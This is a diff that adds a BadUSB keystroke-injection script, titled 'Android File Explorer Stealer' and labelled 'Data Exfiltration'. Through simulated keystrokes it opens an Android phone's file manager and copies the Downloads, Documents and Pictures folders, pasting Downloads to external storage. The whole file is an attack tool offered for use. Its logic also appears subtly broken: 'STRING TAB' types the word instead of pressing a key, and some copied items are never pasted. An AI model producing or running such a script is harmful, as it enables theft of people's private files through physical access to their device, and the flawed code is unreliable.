@@ -1,0 +1,101 @@
+REM Title: Android File Explorer Stealer
+REM Author: BadUSB Library
+REM Description: Steals files using file explorer
+REM Target: Android 7.0+
+REM Category: Data Exfiltration
+REM Type: Directly Ready
+
+REM Open File Manager
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Files
+ENTER
+DELAY 3000
+
+REM Navigate to Downloads
+STRING Downloads
+ENTER
+DELAY 2000
+
+REM Select all files
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Copy files
+STRING Copy
+ENTER
+DELAY 2000
+
+REM Navigate to external storage
+STRING External storage
+ENTER
+DELAY 2000
+
+REM Paste files
+STRING Paste
+ENTER
+DELAY 3000
+
+REM Navigate to Documents
+STRING Documents
+ENTER
+DELAY 2000
+
+REM Select documents
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Copy documents
+STRING Copy
+ENTER
+DELAY 2000
+
+REM Navigate to Pictures
+STRING Pictures
+ENTER
+DELAY 2000
+
+REM Select pictures
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Copy pictures
+STRING Copy
+ENTER
+DELAY 2000
